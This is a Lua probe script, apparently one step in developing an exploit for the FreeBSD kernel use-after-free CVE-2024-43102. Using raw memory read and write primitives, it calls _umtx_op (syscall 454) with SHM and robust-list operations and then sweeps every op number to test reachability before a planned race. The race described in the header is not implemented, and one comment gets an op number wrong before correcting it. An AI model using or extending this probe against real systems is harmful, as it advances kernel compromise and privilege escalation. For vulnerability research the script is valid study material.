-- CRASH_CLASS: HIGH
-- PROBE 151a: UMTX_OP_SHM(25) reachability and race on syscall 454
--
-- Context: CVE-2024-43102 was a real FreeBSD kernel UAF in _umtx_op UMTX_OP_SHM.
-- All previous probes tested UMTX ops on syscall 557 (wrong!) — the real _umtx_op
-- is syscall 454. Probe 56i2 confirmed ops 5/21 work on 454. SHM(25) and
-- ROBUST_LISTS(26) were NEVER tested on 454. We now have threading via Thrd_create.
--
-- Plan:
--   A) Test SHM ops 25 on syscall 454 — check basic reachability
--   B) Test ROBUST_LISTS op 26 on syscall 454
--   C) If SHM works, race between SHM create/destroy with two threads

print("=== PROBE 151a: UMTX SHM RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- _umtx_op syscall 454
local sc_umtx = make_syscall(454)

print("")
print("--- SECTION A: UMTX_OP_SHM (op=25) REACHABILITY ---")

-- UMTX_OP_SHM = 25
-- FreeBSD signature: _umtx_op(void *obj, int op, u_long val, void *uaddr1, void *uaddr2)
-- For SHM: obj = key address, op = 25, val = SHM flags, uaddr1 = ?, uaddr2 = ?
-- SHM sub-ops are encoded in val:
--   UMTX_SHM_CREAT = 0x01
--   UMTX_SHM_LOOKUP = 0x02
--   UMTX_SHM_DESTROY = 0x04
--   UMTX_SHM_ALIVE = 0x08

local shm_key = memory.alloc(0x100)
-- Zero the key buffer
for i = 0, 0x100 - 8, 8 do
    safe_wq(shm_key + i, uint64(0))
end
-- Set a key value
safe_wq(shm_key, uint64(0x41414141))

-- Result buffer
local result_buf = memory.alloc(0x100)
for i = 0, 0x100 - 8, 8 do
    safe_wq(result_buf + i, uint64(0))
end

-- Test UMTX_SHM_CREAT (val=1)
local ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
local ret_num = ok and to_num(ret) or -999
print(string.format("SHM_CREAT(key=0x41414141): ok=%s ret=%d", tostring(ok), ret_num))
if ok and ret then
    local h, l = get_hi_lo(ret)
    print(string.format("  raw: h=0x%X l=0x%X", h, l))
end

-- Test UMTX_SHM_LOOKUP (val=2)
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(2), uint64(0), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
print(string.format("SHM_LOOKUP(key=0x41414141): ok=%s ret=%d", tostring(ok), ret_num))
if ok and ret then
    local h, l = get_hi_lo(ret)
    print(string.format("  raw: h=0x%X l=0x%X", h, l))
end

-- Test UMTX_SHM_ALIVE (val=8)
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
print(string.format("SHM_ALIVE(key=0x41414141): ok=%s ret=%d", tostring(ok), ret_num))

-- Test UMTX_SHM_DESTROY (val=4)
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
print(string.format("SHM_DESTROY(key=0x41414141): ok=%s ret=%d", tostring(ok), ret_num))

-- Try with different key values
for _, key_val in ipairs({0, 1, 0x1000, 0xDEADBEEF}) do
    safe_wq(shm_key, uint64(key_val))
    ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(shm_key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    ret_num = ok and to_num(ret) or -999
    print(string.format("SHM_CREAT(key=0x%X): ok=%s ret=%d", key_val, tostring(ok), ret_num))
end

-- Try with obj as a pointer to a mutex structure
local mtx = memory.alloc(0x40)
for i = 0, 0x38, 8 do safe_wq(mtx + i, uint64(0)) end
safe_wd(mtx, pid) -- owner = our pid

ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(mtx)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
print(string.format("SHM_CREAT(obj=mtx_pid): ok=%s ret=%d", tostring(ok), ret_num))

print("")
print("--- SECTION B: UMTX_OP_ROBUST_LISTS (op=26) ---")

-- UMTX_OP_ROBUST_LISTS = 26
-- FreeBSD 11: reads robust list head from uaddr1
local robust_head = memory.alloc(0x40)
for i = 0, 0x38, 8 do safe_wq(robust_head + i, uint64(0)) end

-- val = sizeof(robust_list_head) for FreeBSD
ok, ret = pcall(function()
    return sc_umtx(uint64(0), uint64(26), uint64(0x18), uint64(to_num(robust_head)), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
print(string.format("ROBUST_LISTS(size=0x18): ok=%s ret=%d", tostring(ok), ret_num))

ok, ret = pcall(function()
    return sc_umtx(uint64(0), uint64(26), uint64(0x30), uint64(to_num(robust_head)), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
print(string.format("ROBUST_LISTS(size=0x30): ok=%s ret=%d", tostring(ok), ret_num))

print("")
print("--- SECTION C: OTHER UMTX OPS ---")

-- Test additional ops we haven't tried on 454
-- UMTX_OP_MUTEX_TRYLOCK = 6
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(mtx)), uint64(6), uint64(0), uint64(0), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
print(string.format("MUTEX_TRYLOCK: ok=%s ret=%d", tostring(ok), ret_num))

-- UMTX_OP_MUTEX_LOCK = 5 (known working from 56i2)
-- Set owner=0 so we can acquire it
safe_wd(mtx, 0)
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(mtx)), uint64(5), uint64(0), uint64(0), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
local owner_after = safe_rd(mtx)
print(string.format("MUTEX_LOCK: ok=%s ret=%d owner_after=0x%X", tostring(ok), ret_num, owner_after or 0))

-- UMTX_OP_MUTEX_UNLOCK = 6
-- Wait, 6 might be UNLOCK not TRYLOCK. Let me use the correct op numbers.
-- UMTX_OP_LOCK = 0
-- UMTX_OP_UNLOCK = 1
-- UMTX_OP_WAIT = 2
-- UMTX_OP_WAKE = 3
-- UMTX_OP_MUTEX_TRYLOCK = 4
-- UMTX_OP_MUTEX_LOCK = 5
-- UMTX_OP_MUTEX_UNLOCK = 6
-- UMTX_OP_SET_CEILING = 7
-- UMTX_OP_CV_WAIT = 8
-- UMTX_OP_CV_SIGNAL = 9
-- UMTX_OP_CV_BROADCAST = 10
-- UMTX_OP_WAIT_UINT = 11
-- UMTX_OP_RW_RDLOCK = 12
-- UMTX_OP_RW_WRLOCK = 13
-- UMTX_OP_RW_UNLOCK = 14
-- UMTX_OP_WAIT_UINT_PRIVATE = 15
-- UMTX_OP_WAKE_PRIVATE = 16
-- UMTX_OP_MUTEX_WAIT = 17
-- UMTX_OP_MUTEX_WAKE = 18
-- UMTX_OP_SEM_WAIT = 19
-- UMTX_OP_SEM_WAKE = 20
-- UMTX_OP_NWAKE_PRIVATE = 21
-- UMTX_OP_MUTEX_WAKE2 = 22
-- UMTX_OP_SEM2_WAIT = 23
-- UMTX_OP_SEM2_WAKE = 24
-- UMTX_OP_SHM = 25
-- UMTX_OP_ROBUST_LISTS = 26

-- Unlock (6)
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(mtx)), uint64(6), uint64(0), uint64(0), uint64(0))
end)
ret_num = ok and to_num(ret) or -999
print(string.format("MUTEX_UNLOCK: ok=%s ret=%d", tostring(ok), ret_num))

-- Test ops 0-24 quickly for reachability
print("")
print("--- SECTION D: OP SWEEP 0-26 ---")
local sweep_mtx = memory.alloc(0x40)
for i = 0, 0x38, 8 do safe_wq(sweep_mtx + i, uint64(0)) end

for op = 0, 26 do
    -- Skip known working (5, 21) and known tested (25, 26)
    if op ~= 5 and op ~= 21 and op ~= 25 and op ~= 26 then
        -- Reset the mutex
        for i = 0, 0x38, 8 do safe_wq(sweep_mtx + i, uint64(0)) end

        ok, ret = pcall(function()
            return sc_umtx(uint64(to_num(sweep_mtx)), uint64(op), uint64(0), uint64(0), uint64(0))
        end)
        ret_num = ok and to_num(ret) or -999
        print(string.format("op=%d: ok=%s ret=%d", op, tostring(ok), ret_num))
    end
end

-- Canary check
ok, ret = pcall(function() return syscall.getpid() end)
print("")
print("canary: " .. tostring(ok) .. " pid=" .. tostring(to_num(ret)))

print("")
print("=== PROBE 151a COMPLETE ===")
